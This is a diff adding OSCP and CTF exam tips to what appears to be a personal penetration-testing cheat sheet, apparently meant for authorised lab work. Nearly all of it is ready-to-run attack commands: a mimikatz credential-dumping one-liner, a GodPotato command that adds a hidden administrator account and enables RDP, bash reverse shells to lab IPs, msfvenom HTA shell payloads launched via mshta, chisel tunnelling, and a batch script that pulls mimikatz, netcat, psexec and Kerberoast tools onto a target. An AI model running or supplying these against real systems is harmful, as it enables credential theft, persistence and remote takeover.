@@ -2,6 +2,72 @@
 
 # OSCP / CTF
 
+OSCP EXAM TIPS TRICKS
+```
+
+mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
+
+tree /f /a c:\users\
+
+GodPotato-NET4.exe -cmd "cmd /c net user buser Passw0rd /add && net localgroup \"Remote Desktop users\" buser /add && net localgroup Administrators buser /add && reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
+
+bash -i >& /dev/tcp/192.168.45.167/80 0>&1
+
+msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f hta-psh > shell.hta
+msfvenom -p windows/shell_bind_tcp lport=443 -f hta-psh > shell.hta
+mshta http://192.168.45.214/shell.hta
+
+start /B "" chisel-x64_w11.exe client 192.168.45.173:8001 R:1080:socks
+
+
+
+```
+
+GETPACK
+```
+└─$ cat getpack.bat               
+@echo off
+rem curl 192.168.45.181/getpack.bat -o %temp%\getpack.bat
+set arg1=%1
+
+rem curl %arg1%/getpack.zip 
+rem powershell -command {Expand-Archive -Force $env:temp\getpack.zip $env:temp}
+
+cd %temp%
+curl %arg1%/mimikatz.exe -o %temp%\mimikatz.exe
+curl %arg1%/chisel.exe -o %temp%\chisel.exe
+curl %arg1%/godpotato.exe -o %temp%\godpotato.exe
+curl %arg1%/nc.exe -o %temp%\nc.exe
+curl %arg1%/mweb.exe -o %temp%\mweb.exe
+curl %arg1%/mweb -o %temp%\mweb
+curl %arg1%/psexec64.exe -o %temp%\psexec64.exe
+curl %arg1%/pforward.exe -o %temp%\pforward.exe
+curl %arg1%/ncat.exe -o %temp%\ncat.exe
+curl %arg1%/winpeas.bat -o %temp%\winpeas.bat
+curl %arg1%/letmein.bat -o %temp%\letmein.bat
+curl %arg1%/linpeas.sh -o %temp%\linpeas.sh
+curl %arg1%/getAllDomainGroups.ps1 -o %temp%\getAllDomainGroups.ps1
+curl %arg1%/getListSPNS.ps1 -o %temp%\getListSPNS.ps1
+curl %arg1%/Invoke-Kerberoast.ps1 -o %temp%\Invoke-Kerberoast.ps1
+curl %arg1%/windows-privesc-check2.exe -o %temp%\windows-privesc-check2.exe
+```
+
+
+
+echo start /B "" chisel.exe client %arg1%:8001 R:1080:socks
+echo mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
+echo start /B "" pforward.exe -listenIP 0.0.0.0 -localPort 8080 -targetIP %arg1% -targetPort 80 
+echo start /B "" run mweb.exe -port 8888
+echo download: curl -O localhost:8080/download/test.txt
+echo upload: curl -X POST -F "file=@AnyDesk.exe" http://localhost:8080/upload
+echo psexec64.exe -accepteula \\ip cmd
+echo godpotato.exe -cmd "cmd /c whoami" 
+
+
+
+
+
+
 BASH TCP SHELL
 ```
 bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
